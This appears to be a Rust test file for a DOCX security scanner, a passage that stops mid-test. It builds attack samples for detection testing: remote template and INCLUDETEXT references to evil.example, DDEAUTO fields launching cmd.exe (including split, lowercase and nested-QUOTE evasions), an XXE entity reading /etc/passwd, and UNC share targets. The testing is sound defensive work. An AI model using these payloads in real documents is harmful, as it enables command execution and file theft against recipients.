//! DOCX 보안 테스트: 원격 참조, 매크로, OLE·ActiveX, DDE 필드, XML 공격.

mod common;

use std::path::Path;

use bookdoctor::cli::{Options, run};
use bookdoctor::scan::scan_file;
use scan_common::{Category, FileReport, Finding, Severity};

const REL_NS: &str = "http://schemas.openxmlformats.org/package/2006/relationships";
const TYPE_BASE: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

/// `(관계 종류 접미사, 대상, 외부 여부)` 목록으로 .rels XML을 만든다.
fn rels(items: &[(&str, &str, bool)]) -> Vec<u8> {
    let body: String = items
        .iter()
        .enumerate()
        .map(|(i, (ty, target, ext))| format!(r#"<Relationship Id="rId{i}" Type="{TYPE_BASE}/{ty}" Target="{target}"{}/>"#, if *ext { r#" TargetMode="External""# } else { "" }))
        .collect();
    format!(r#"<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="{REL_NS}">{body}</Relationships>"#).into_bytes()
}

fn document(body: &str) -> Vec<u8> {
    format!(r#"<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>{body}</w:body></w:document>"#).into_bytes()
}

/// 한 필드의 지시문을 여러 run에 나눠 담은 문단.
fn field(segments: &[&str]) -> String {
    let runs: String = segments.iter().map(|s| format!("<w:r><w:instrText>{s}</w:instrText></w:r>")).collect();
    format!(r#"<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>{runs}<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>"#)
}

fn scan_named(file: &str, add: &[(&str, &[u8])]) -> (tempfile::TempDir, FileReport) {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join(file);
    common::docx_with(&p, &[], add);
    let r = scan_file(&p, &Options::default());
    (d, r)
}

fn docx(add: &[(&str, &[u8])]) -> FileReport {
    scan_named("a.docx", add).1
}

fn finding<'a>(r: &'a FileReport, code: &str) -> &'a Finding {
    r.findings.iter().find(|f| f.code == code).unwrap_or_else(|| panic!("{code} missing: {:?} / {:?}", r.findings, r.reasons))
}

fn assert_security(r: &FileReport, code: &str, severity: Severity) {
    let f = finding(r, code);
    assert_eq!((f.category, f.severity), (Category::Security, severity), "{code}: {:?}", r.findings);
}

fn has_ooxml(r: &FileReport) -> bool {
    r.findings.iter().any(|f| f.code.starts_with("OOXML_") && f.category == Category::Security)
}

// --- 관계 ---

#[test]
fn attached_template_external_is_critical_and_internal_is_clean() {
    let r = docx(&[("word/_rels/settings.xml.rels", &rels(&[("attachedTemplate", "http://evil.example/t.dotm", true)]))]);
    assert_security(&r, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
    let clean = docx(&[("word/_rels/settings.xml.rels", &rels(&[("attachedTemplate", "template.dotm", false)]))]);
    assert!(!has_ooxml(&clean), "{:?}", clean.findings);
}

#[test]
fn ordinary_external_hyperlink_is_clean() {
    let r = docx(&[("word/_rels/document.xml.rels", &rels(&[("hyperlink", "https://example.com/page", true), ("hyperlink", "mailto:a@example.com", true)]))]);
    assert!(!has_ooxml(&r), "일반 하이퍼링크는 소음이 되면 안 된다: {:?}", r.findings);
}

#[test]
fn external_ole_object_subdocument_frame_and_link_path_are_high() {
    for ty in ["oleObject", "subDocument", "frame", "externalLinkPath"] {
        let r = docx(&[("word/_rels/document.xml.rels", &rels(&[(ty, "http://evil.example/x", true)]))]);
        assert_security(&r, "OOXML_EXTERNAL_OBJECT", Severity::High);
    }
}

#[test]
fn unc_and_file_targets_are_high_for_any_relationship_type() {
    for target in ["\\\\\\\\evil\\\\share\\\\x.png", "FILE://host/x", "file://evil.example/share/x.png"] {
        let r = docx(&[("word/_rels/document.xml.rels", &rels(&[("hyperlink", target, true)]))]);
        assert_security(&r, "OOXML_UNC_TARGET", Severity::High);
    }
}

#[test]
fn external_image_is_medium_and_hidden_by_default() {
    let r = docx(&[("word/_rels/document.xml.rels", &rels(&[("image", "http://tracker.example/p.gif", true)]))]);
    assert_security(&r, "OOXML_EXTERNAL_IMAGE", Severity::Medium);
    let d = tempfile::tempdir().unwrap();
    common::docx_with(&d.path().join("img.docx"), &[], &[("word/_rels/document.xml.rels", &rels(&[("image", "http://tracker.example/p.gif", true)]))]);
    let show = |extra: &[&str]| {
        let mut argv: Vec<String> = extra.iter().map(|s| s.to_string()).collect();
        argv.extend(["--color".into(), "never".into(), "-r".into(), d.path().to_string_lossy().into_owned()]);
        let mut out = Vec::new();
        run(&argv, &mut out);
        String::from_utf8(out).unwrap()
    };
    assert!(!show(&[]).contains("OOXML_EXTERNAL_IMAGE"));
    assert!(show(&["--min-severity", "low"]).contains("OOXML_EXTERNAL_IMAGE"));
}

// --- 부분 ---

#[test]
fn vba_project_is_critical_in_docx_and_high_in_docm() {
    let add: &[(&str, &[u8])] = &[("word/vbaProject.bin", b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1 macro")];
    assert_security(&scan_named("a.docx", add).1, "OOXML_VBA_PROJECT", Severity::Critical);
    assert_security(&scan_named("a.dotx", add).1, "OOXML_VBA_PROJECT", Severity::Critical);
    assert_security(&scan_named("a.docm", add).1, "OOXML_VBA_PROJECT", Severity::High);
    assert_security(&scan_named("a.dotm", add).1, "OOXML_VBA_PROJECT", Severity::High);
    assert!(!has_ooxml(&scan_named("a.docm", &[]).1));
}

#[test]
fn embedded_ole_activex_and_packages_are_flagged_by_part() {
    let ole = docx(&[("word/embeddings/oleObject1.bin", b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1 data")]);
    assert_security(&ole, "OOXML_OLE_OBJECT", Severity::High);
    let ax = docx(&[("word/activeX/activeX1.xml", b"<ax:ocx xmlns:ax='urn:x'/>"), ("word/activeX/activeX1.bin", b"binary")]);
    assert_security(&ax, "OOXML_ACTIVEX", Severity::High);
    let pkg = docx(&[("word/embeddings/Microsoft_Word_Document1.docx", b"PK\x03\x04 inner")]);
    assert_security(&pkg, "OOXML_EMBEDDED_PACKAGE", Severity::Medium);
}

// --- 필드 ---

#[test]
fn dde_fields_are_critical_including_split_runs_and_fldsimple_and_lowercase() {
    let plain = docx(&[("word/document.xml", &document(&field(&[" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\""])))]);
    assert_security(&plain, "OOXML_DDE_FIELD", Severity::Critical);
    let split = docx(&[("word/document.xml", &document(&field(&[" DDE", "AUTO c:\\\\windows\\\\system32\\\\cmd.exe"])))]);
    assert_security(&split, "OOXML_DDE_FIELD", Severity::Critical);
    let simple = docx(&[("word/document.xml", &document(r#"<w:fldSimple w:instr=" DDEAUTO calc.exe "><w:r><w:t>x</w:t></w:r></w:fldSimple>"#))]);
    assert_security(&simple, "OOXML_DDE_FIELD", Severity::Critical);
    let lower = docx(&[("word/document.xml", &document(&field(&["  dde cmd.exe "])))]);
    assert_security(&lower, "OOXML_DDE_FIELD", Severity::Critical);
}

#[test]
fn include_fields_are_high_only_when_they_point_at_a_url_or_unc() {
    for instr in [" INCLUDETEXT \"http://evil.example/x.docx\" ", " INCLUDEPICTURE \"\\\\\\\\evil\\\\share\\\\p.png\" ", " LINK Excel.Sheet.12 \"\\\\\\\\evil\\\\share\\\\x.xlsx\" "] {
        let r = docx(&[("word/document.xml", &document(&field(&[instr])))]);
        assert_security(&r, "OOXML_DANGEROUS_FIELD", Severity::High);
    }
    for instr in [" INCLUDETEXT \"chapter2.docx\" ", " PAGE ", " HYPERLINK \"https://example.com\" ", " TOC \\\\o \"1-3\" "] {
        let r = docx(&[("word/document.xml", &document(&field(&[instr])))]);
        assert!(!has_ooxml(&r), "{instr}: {:?}", r.findings);
    }
}

// --- XML 공격과 한도 ---

#[test]
fn xml_entity_and_dtd_attacks_use_the_epub_codes() {
    let xxe = br#"<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>&x;</w:body></w:document>"#;
    assert_security(&docx(&[("word/document.xml", xxe)]), "XXE_ENTITY", Severity::Critical);
    let dtd = br#"<?xml version="1.0"?><!DOCTYPE d SYSTEM "http://evil.example/x.dtd"><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>"#;
    assert!(docx(&[("word/document.xml", dtd)]).has("EXTERNAL_DTD"));
    let local = br#"<?xml version="1.0"?><!DOCTYPE d [<!ENTITY y "text">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>"#;
    assert_security(&docx(&[("word/document.xml", local)]), "ENTITY_DECLARATION", Severity::Medium);
}

#[test]
fn part_larger_than_the_budget_is_incomplete_not_read_in_full() {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join("big.docx");
    let mut big = document("<w:p/>");
    big.extend(vec![b' '; 3 * 1024 * 1024]);
    common::docx_with(&p, &[], &[("word/document.xml", &big)]);
    let r = scan_file(&p, &Options { max_total_mb: 1, ..Options::default() });
    assert!(r.incomplete, "{:?} {:?}", r.findings, r.reasons);
}

#[test]
fn clean_docx_with_normal_relationships_has_no_security_findings() {
    let r = docx(&[
        ("word/_rels/document.xml.rels", &rels(&[("hyperlink", "https://example.com", true), ("styles", "styles.xml", false), ("image", "media/image1.png", false)])),
        ("word/document.xml", &document(&field(&[" PAGE "]))),
    ]);
    assert!(r.findings.is_empty() && !r.incomplete, "{:?} {:?}", r.findings, r.reasons);
}

#[allow(dead_code)]
fn _unused(_: &Path) {}

// --- 보안 검토 반영: 인코딩, 대소문자·경로, 중첩 필드 ---

fn utf16(text: &str, little: bool) -> Vec<u8> {
    let mut out = if little { vec![0xFF, 0xFE] } else { vec![0xFE, 0xFF] };
    for unit in text.encode_utf16() {
        out.extend(if little { unit.to_le_bytes() } else { unit.to_be_bytes() });
    }
    out
}

fn rels_text(items: &[(&str, &str, bool)]) -> String {
    String::from_utf8(rels(items)).unwrap()
}

fn doc_text(body: &str) -> String {
    String::from_utf8(document(body)).unwrap()
}

#[test]
fn utf16_encoded_parts_are_still_inspected() {
    for little in [true, false] {
        let r = docx(&[("word/_rels/settings.xml.rels", &utf16(&rels_text(&[("attachedTemplate", "http://evil.example/t.dotm", true)]), little))]);
        assert_security(&r, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
        let r = docx(&[("word/document.xml", &utf16(&doc_text(&field(&[" DDEAUTO cmd.exe "])), little))]);
        assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
    }
}

#[test]
fn valid_utf16_document_is_not_reported_as_malformed() {
    let r = docx(&[("word/document.xml", &utf16(&doc_text("<w:p><w:r><w:t>본문</w:t></w:r></w:p>"), true))]);
    assert!(!r.has("MALFORMED_MARKUP") && r.findings.is_empty(), "{:?}", r.findings);
}

#[test]
fn utf32_part_cannot_be_inspected_and_is_incomplete() {
    let mut part = vec![0xFF, 0xFE, 0x00, 0x00];
    part.extend(b"<\0\0\0w\0\0\0".iter());
    let r = docx(&[("word/_rels/settings.xml.rels", &part)]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("UTF-32")), "{:?}", r.reasons);
}

#[test]
fn unparsable_relationship_part_makes_the_scan_incomplete_not_silent() {
    let r = docx(&[("word/_rels/settings.xml.rels", b"<Relationships><Relationship Target=")]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("settings.xml.rels") && x.contains("parsed")), "{:?}", r.reasons);
}

#[test]
fn xml_and_rels_parts_are_inspected_whatever_their_case_or_directory() {
    let r = docx(&[("Word/_Rels/Settings.Xml.Rels", &rels(&[("attachedTemplate", "http://evil.example/t.dotm", true)]))]);
    assert_security(&r, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
    let r = docx(&[("WORD/FOOTER1.XML", &document(&field(&[" DDEAUTO cmd.exe "])))]);
    assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
    let r = docx(&[("customXml/item1.xml", &document(&field(&[" DDE cmd.exe "])))]);
    assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
    let r = docx(&[("Word/VBAProject.BIN", b"\xD0\xCF\x11\xE0 macro")]);
    assert_security(&r, "OOXML_VBA_PROJECT", Severity::Critical);
}

const BEGIN: &str = r#"<w:r><w:fldChar w:fldCharType="begin"/></w:r>"#;
const END: &str = r#"<w:r><w:fldChar w:fldCharType="end"/></w:r>"#;

fn instr(text: &str) -> String {
    format!("<w:r><w:instrText>{text}</w:instrText></w:r>")
}

#[test]
fn field_whose_keyword_is_computed_by_a_nested_field_is_flagged() {
    // 바깥 필드의 지시문 맨 앞이 안쪽 필드(QUOTE)의 결과다. 키워드를 숨겨 DDE를 조립하는 방식이다.
    let body = format!("<w:p>{BEGIN}{BEGIN}{}{END}{}{END}</w:p>", instr(" QUOTE 68 68 69 65 85 84 79 "), instr(" c:\\\\windows\\\\system32\\\\cmd.exe "));
    let r = docx(&[("word/document.xml", &document(&body))]);
    assert_security(&r, "OOXML_COMPUTED_FIELD", Severity::High);
}

#[test]
fn ordinary_nested_fields_are_not_flagged() {
    let nested_if = format!("<w:p>{BEGIN}{}{BEGIN}{}{END}{}{END}</w:p>", instr(" IF "), instr(" PAGE "), instr(" > 1 \"a\" \"b\" "));
    let plain = field(&[" PAGE "]);
    let r = docx(&[("word/document.xml", &document(&format!("{nested_if}{plain}")))]);
    assert!(!has_ooxml(&r), "{:?}", r.findings);
}

#[test]
fn nested_text_is_included_when_classifying_the_outer_field() {
    let body = format!("<w:p>{BEGIN}{}{BEGIN}{}{END}{END}</w:p>", instr(" INCLUDETEXT "), instr(" QUOTE \"http://evil.example/x.docx\" "));
    let r = docx(&[("word/document.xml", &document(&body))]);
    assert_security(&r, "OOXML_DANGEROUS_FIELD", Severity::High);
}

// --- 보안 검토 3차: 중첩 상한, 확장자 없는 XML, 인코딩 ---

#[test]
fn deeply_nested_fields_are_capped_and_reported_incomplete_without_quadratic_work() {
    let depth = 4000;
    let chunk = "x".repeat(512);
    let mut body = String::from("<w:p>");
    for _ in 0..depth {
        body.push_str(BEGIN);
        body.push_str(&instr(&chunk));
    }
    for _ in 0..depth {
        body.push_str(END);
    }
    body.push_str("</w:p>");
    let start = std::time::Instant::now();
    let r = docx(&[("word/document.xml", &document(&body))]);
    assert!(start.elapsed() < std::time::Duration::from_secs(10), "{:?}", start.elapsed());
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("nesting")), "{:?}", r.reasons);
}

#[test]
fn xml_hidden_in_a_part_with_another_extension_is_still_inspected() {
    let dde = document(&field(&[" DDEAUTO cmd.exe "]));
    for name in ["word/footer9.dat", "customXml/item7", "word/footer9.xml.bak"] {
        let r = docx(&[(name, &dde)]);
        assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
    }
    let rels_hidden = rels(&[("attachedTemplate", "http://evil.example/t.dotm", true)]);
    assert_security(&docx(&[("word/_rels/settings.data", &rels_hidden)]), "OOXML_REMOTE_TEMPLATE", Severity::Critical);
}

#[test]
fn binary_parts_without_xml_are_not_parsed_or_reported() {
    let r = docx(&[("word/media/blob.dat", &[0x00, 0x01, 0x02, 0xFF, 0xFE, 0x10, 0x20][..]), ("word/media/text.dat", b"plain words, not xml")]);
    assert!(r.findings.is_empty() && !r.incomplete, "{:?} {:?}", r.findings, r.reasons);
}

#[test]
fn utf16_without_a_bom_is_decoded_by_the_nul_pattern() {
    let text = doc_text(&field(&[" DDEAUTO cmd.exe "]));
    let mut b = Vec::new();
    for u in text.encode_utf16() {
        b.extend(u.to_le_bytes());
    }
    let r = docx(&[("word/document.xml", &b)]);
    assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
}

#[test]
fn non_utf8_bytes_and_other_declared_encodings_are_incomplete() {
    let invalid = b"<?xml version=\"1.0\"?><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body>\xFF\xFE\xFD</w:body></w:document>";
    let r = docx(&[("word/footer1.xml", invalid)]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("non-UTF-8")), "{:?}", r.reasons);
    let cp = br#"<?xml version="1.0" encoding="windows-1252"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>"#;
    let r = docx(&[("word/footer2.xml", cp)]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("windows-1252")), "{:?}", r.reasons);
}

#[test]
fn utf8_and_utf16_declarations_are_not_incomplete() {
    for decl in ["UTF-8", "utf-8", "US-ASCII"] {
        let xml = format!(r#"<?xml version="1.0" encoding="{decl}"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body/></w:document>"#);
        let r = docx(&[("word/footer3.xml", xml.as_bytes())]);
        assert!(!r.incomplete, "{decl}: {:?}", r.reasons);
    }
}

#[test]
fn parse_failures_are_recorded_even_when_the_part_has_no_field_markup() {
    let r = docx(&[("word/footer4.xml", b"<w:p><w:r>unclosed")]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("footer4.xml") && x.contains("parsed")), "{:?}", r.reasons);
}

// --- 최종 리뷰 수정 ---

fn docx_stored(add: &[(&str, &[u8])]) -> (tempfile::TempDir, std::path::PathBuf) {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join("s.docx");
    let mut parts: Vec<(String, Vec<u8>)> = common::minimal_docx_parts();
    for (n, b) in add {
        parts.retain(|(x, _)| x != n);
        parts.push((n.to_string(), b.to_vec()));
    }
    let refs: Vec<(&str, &[u8])> = parts.iter().map(|(n, b)| (n.as_str(), b.as_slice())).collect();
    common::zip_stored(&p, &refs);
    (d, p)
}

fn padded_dde() -> Vec<u8> {
    document(&format!("{}<!-- {} -->", field(&[" DDEAUTO cmd.exe "]), " ".repeat(9000)))
}

#[test]
fn forged_declared_size_in_the_main_part_is_not_clean_in_default_mode() {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join("forged.docx");
    common::docx_with(&p, &[], &[("word/document.xml", &padded_dde())]);
    let mut b = std::fs::read(&p).unwrap();
    let name = b"word/document.xml";
    let local = (0..b.len() - 30).find(|&i| &b[i..i + 4] == b"PK\x03\x04" && b[i + 30..].starts_with(name)).unwrap();
    b[local + 22..local + 26].copy_from_slice(&5000u32.to_le_bytes());
    let central = (0..b.len() - 46).find(|&i| &b[i..i + 4] == b"PK\x01\x02" && b[i + 46..].starts_with(name)).unwrap();
    b[central + 24..central + 28].copy_from_slice(&5000u32.to_le_bytes());
    std::fs::write(&p, b).unwrap();
    let r = scan_file(&p, &Options::default());
    assert!(r.has("ZIP_SIZE_MISMATCH") && r.incomplete, "기본 모드에서도 못 읽은 부분을 깨끗하다고 하면 안 된다: {:?} {:?}", r.findings, r.reasons);
}

#[test]
fn crc_error_in_the_main_part_is_reported_and_the_content_is_still_inspected() {
    let (_d, p) = docx_stored(&[("word/document.xml", &padded_dde())]);
    let mut b = std::fs::read(&p).unwrap();
    let at = common::data_offset(&b, "word/document.xml");
    b[at + 6000] ^= 0x01; // 주석 안의 공백 하나
    std::fs::write(&p, b).unwrap();
    let r = scan_file(&p, &Options::default());
    assert!(r.has("ZIP_CRC_MISMATCH"), "{:?}", r.findings);
    assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
}

#[test]
fn macro_and_ole_parts_are_found_through_relationships_and_content() {
    let ole = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1 payload";
    let vba = rels(&[("vbaProject", "macros.dat", false)]);
    let add: &[(&str, &[u8])] = &[("word/_rels/document.xml.rels", &vba), ("word/macros.dat", ole)];
    assert_security(&scan_named("a.docm", add).1, "OOXML_VBA_PROJECT", Severity::High);
    assert_security(&scan_named("a.docx", add).1, "OOXML_VBA_PROJECT", Severity::Critical);
    let olerel = rels(&[("oleObject", "media/image1.png", false)]);
    let r = docx(&[("word/_rels/document.xml.rels", &olerel), ("word/media/image1.png", ole)]);
    assert_security(&r, "OOXML_OLE_OBJECT", Severity::High);
    let r = docx(&[("word/blob.dat", ole)]);
    assert_security(&r, "OOXML_OLE_OBJECT", Severity::High);
    let ctrl = docx(&[("word/_rels/document.xml.rels", &rels(&[("control", "activeX/a.xml", false)])), ("word/activeX/a.xml", b"<ax/>")]);
    assert_security(&ctrl, "OOXML_ACTIVEX", Severity::High);
}

#[test]
fn local_template_and_local_file_references_are_low_not_critical() {
    let r = docx(&[("word/_rels/settings.xml.rels", &rels(&[("attachedTemplate", "file:///C:\\Users\\kim\\Templates\\Report.dotx", true)]))]);
    assert!(!r.has("OOXML_REMOTE_TEMPLATE") && !r.has("OOXML_UNC_TARGET"), "{:?}", r.findings);
    assert_eq!(finding(&r, "OOXML_LOCAL_TEMPLATE").severity, Severity::Low);
    let remote = docx(&[("word/_rels/settings.xml.rels", &rels(&[("attachedTemplate", "\\\\corp\\share\\t.dotm", true)]))]);
    assert_security(&remote, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
    let host = docx(&[("word/_rels/settings.xml.rels", &rels(&[("attachedTemplate", "file://corp/share/t.dotm", true)]))]);
    assert_security(&host, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
}

#[test]
fn web_pasted_pictures_are_medium_and_remote_includes_stay_high() {
    let pic = docx(&[("word/document.xml", &document(&field(&[" INCLUDEPICTURE \"https://upload.wikimedia.org/a.png\" \\* MERGEFORMATINET "])))]);
    assert_security(&pic, "OOXML_DANGEROUS_FIELD", Severity::Medium);
    let text = docx(&[("word/document.xml", &document(&field(&[" INCLUDETEXT \"http://evil.example/x.docx\" "])))]);
    assert_security(&text, "OOXML_DANGEROUS_FIELD", Severity::High);
}

#[test]
fn main_part_is_resolved_through_the_officedocument_relationship_case_insensitively() {
    let root = rels(&[("officeDocument", "word/document2.xml", false)]);
    let (d, p) = {
        let d = tempfile::tempdir().unwrap();
        let p = d.path().join("d2.docx");
        common::docx_with(&p, &["word/document.xml"], &[("_rels/.rels", &root), ("word/document2.xml", &document("<w:p/>"))]);
        (d, p)
    };
    let r = scan_file(&p, &Options::default());
    assert!(!r.has("OOXML_NOT_DOCX"), "{:?}", r.findings);
    let root = rels(&[("officeDocument", "/WORD/Document.XML", false)]);
    let p2 = d.path().join("d3.docx");
    common::docx_with(&p2, &[], &[("_rels/.rels", &root)]);
    assert!(!scan_file(&p2, &Options::default()).has("OOXML_NOT_DOCX"));
    let missing = rels(&[("officeDocument", "word/gone.xml", false)]);
    let p3 = d.path().join("d4.docx");
    common::docx_with(&p3, &[], &[("_rels/.rels", &missing)]);
    let r = scan_file(&p3, &Options::default());
    assert!(r.findings.iter().any(|f| f.code == "OOXML_NOT_DOCX" && f.location == "word/gone.xml"), "{:?}", r.findings);
}

#[test]
fn the_part_cap_cannot_push_the_main_document_out_of_the_scan() {
    let junk = document("<w:p/>");
    let mut adds: Vec<(String, Vec<u8>)> = (0..300).map(|i| (format!("customXml/item{i}.xml"), junk.clone())).collect();
    adds.push(("word/document.xml".into(), document(&field(&[" DDEAUTO cmd.exe "]))));
    let refs: Vec<(&str, &[u8])> = adds.iter().map(|(n, b)| (n.as_str(), b.as_slice())).collect();
    let r = docx(&refs);
    assert_security(&r, "OOXML_DDE_FIELD", Severity::Critical);
}

#[test]
fn entries_beyond_max_files_are_not_walked_and_the_scan_is_incomplete() {
    use bookdoctor::epub::security::Limits;
    use bookdoctor::zipcheck::ooxml::inspect_security;
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join("many.docx");
    let junk: Vec<(String, Vec<u8>)> = (0..200).map(|i| (format!("junk/{i}.dat"), b"x".to_vec())).collect();
    let mut refs: Vec<(&str, &[u8])> = junk.iter().map(|(n, b)| (n.as_str(), b.as_slice())).collect();
    let doc = document(&field(&[" DDEAUTO cmd.exe "]));
    refs.push(("word/document.xml", &doc));
    common::zip_of(&p, &refs);
    let mut spent = 0u64;
    let mut r = FileReport::new(&p, None);
    inspect_security(&p, &Limits { max_files: 50, ..Limits::default() }, false, &mut spent, &mut r);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("entries")), "{:?}", r.reasons);
}

#[test]
fn structure_reads_are_charged_to_the_shared_budget() {
    use bookdoctor::epub::security::Limits;
    use bookdoctor::zipcheck::ooxml::inspect_structure;
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join("s.docx");
    common::docx_with(&p, &[], &[]);
    let mut spent = 0u64;
    let mut r = FileReport::new(&p, None);
    inspect_structure(&p, &Limits { max_total: 100, ..Limits::default() }, &mut spent, &mut r);
    assert!(r.incomplete && spent > 0, "{:?} {spent}", r.reasons);
}

#[test]
fn xml_with_a_long_whitespace_prefix_is_still_recognized() {
    // XML 선언은 맨 앞에만 올 수 있으므로 선언 없이 공백 뒤에 루트 요소를 둔다.
    let dde = String::from_utf8(document(&field(&[" DDEAUTO cmd.exe "]))).unwrap().replacen("<?xml version=\"1.0\" encoding=\"UTF-8\"?>", "", 1).into_bytes();
    let mut padded = vec![b' '; 600];
    padded.extend(&dde);
    assert_security(&docx(&[("word/footer9.dat", &padded)]), "OOXML_DDE_FIELD", Severity::Critical);
    let blank = docx(&[("word/blank.dat", &[b' '; 700][..])]);
    assert!(blank.findings.is_empty(), "{:?}", blank.findings);
}

#[test]
fn long_legitimate_field_instructions_are_fine_and_oversized_ones_are_incomplete() {
    let citation = format!(" ADDIN ZOTERO_ITEM CSL_CITATION {{{}}} ", "a".repeat(20_000));
    let r = docx(&[("word/document.xml", &document(&field(&[&citation])))]);
    assert!(r.findings.is_empty() && !r.incomplete, "{:?} {:?}", r.findings, r.reasons);
    let late_url = format!(" INCLUDETEXT \"{}http://evil.example/x.docx\" ", "a".repeat(5_000));
    assert_security(&docx(&[("word/document.xml", &document(&field(&[&late_url])))]), "OOXML_DANGEROUS_FIELD", Severity::High);
    let huge = format!(" ADDIN {{{}}} ", "a".repeat(80_000));
    let r = docx(&[("word/document.xml", &document(&field(&[&huge])))]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("truncated")), "{:?}", r.reasons);
}

#[test]
fn xml_declaration_is_parsed_in_full_not_in_a_fixed_window() {
    let ns = r#"xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main""#;
    let late = format!(r#"<?xml version="1.0" standalone="yes" {}encoding="windows-1252"?><w:document {ns}><w:body/></w:document>"#, " ".repeat(400));
    let r = docx(&[("word/footer1.xml", late.as_bytes())]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("windows-1252")), "{:?}", r.reasons);
    let open = format!(r#"<?xml version="1.0" {}"#, " ".repeat(3000));
    let r = docx(&[("word/footer2.xml", open.as_bytes())]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("declaration")), "{:?}", r.reasons);
    let lie = format!(r#"<?xml version="1.0" encoding="UTF-16"?><w:document {ns}><w:body/></w:document>"#);
    let r = docx(&[("word/footer3.xml", lie.as_bytes())]);
    assert!(r.incomplete && r.reasons.iter().any(|x| x.contains("UTF-16")), "{:?}", r.reasons);
}

// --- 보안 검토 4차: file: URL 변형, 소문자 변환 인덱스 ---

#[test]
fn file_urls_with_extra_slashes_backslashes_or_localhost_unc_are_remote() {
    for target in ["file:////corp/share/t.dotm", "file:\\\\corp\\share\\t.dotm", "file://localhost//corp/share/t.dotm", "file:\\\\\\\\corp\\\\share\\\\t.dotm"] {
        let r = docx(&[("word/_rels/settings.xml.rels", &rels(&[("attachedTemplate", target, true)]))]);
        assert_security(&r, "OOXML_REMOTE_TEMPLATE", Severity::Critical);
        assert_security(&r, "OOXML_UNC_TARGET", Severity::High);
    }
    for target in ["file:///C:/Users/x/t.dotx", "file:/C:/Users/x/t.dotx", "file://localhost/C:/Users/x/t.dotx"] {
        let r = docx(&[("word/_rels/settings.xml.rels", &rels(&[("attachedTemplate", target, true)]))]);
        assert!(!r.has("OOXML_REMOTE_TEMPLATE") && !r.has("OOXML_UNC_TARGET"), "{target}: {:?}", r.findings);
        assert_eq!(finding(&r, "OOXML_LOCAL_TEMPLATE").severity, Severity::Low, "{target}");
    }
}

#[test]
fn field_instructions_with_file_unc_variants_are_flagged_and_local_drive_paths_are_not() {
    for instr in [" INCLUDETEXT \"file:////corp/share/x.docx\" ", " INCLUDETEXT \"file:\\\\\\\\corp\\\\share\\\\x.docx\" ", " LINK Word.Document.12 \"file://corp/share/x.docx\" "] {
        let r = docx(&[("word/document.xml", &document(&field(&[instr])))]);
        assert_security(&r, "OOXML_DANGEROUS_FIELD", Severity::High);
    }
    for instr in [" INCLUDETEXT \"file:///C:/docs/x.docx\" ", " INCLUDETEXT \"c:\\\\docs\\\\x.docx\" "] {
        let r = docx(&[("word/document.xml", &document(&field(&[instr])))]);
        assert!(!has_ooxml(&r), "{instr}: {:?}", r.findings);
    }
}

#[test]
fn part_names_whose_lowercase_changes_the_byte_length_do_not_panic_the_scan() {
    // `İ`(U+0130)의 소문자는 바이트 수가 늘어난다. 소문자 문자열의 인덱스로 원본을 자르면 글자 한가운데에서 panic한다.
    let name = format!("word/{}/_rels/한글.rels", "\u{130}".repeat(8));
    let r = docx(&[(name.as_str(), &rels(&[("vbaProject", "m.dat", false)]))]);
    assert!(!r.reasons.iter().any(|x| x.starts_with("panic")), "{:?}", r.reasons);
    assert!(r.findings.iter().any(|f| f.code == "OOXML_VBA_PROJECT" && f.location.ends_with("m.dat")), "{:?}", r.findings);
}

#[test]
fn a_huge_simple_field_instruction_is_capped_and_scanned_in_linear_time() {
    // `file:`이 수십만 번 되풀이되는 지시문. 각 일치마다 나머지 전체를 훑으면 제곱 시간이다.
    let instr = format!("INCLUDETEXT {}", "file:".repeat(80_000));
    let body = format!(r#"<w:p><w:fldSimple w:instr="{instr}"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p>"#);
    let start = std::time::Instant::now();
    let r = docx(&[("word/document.xml", &document(&body))]);
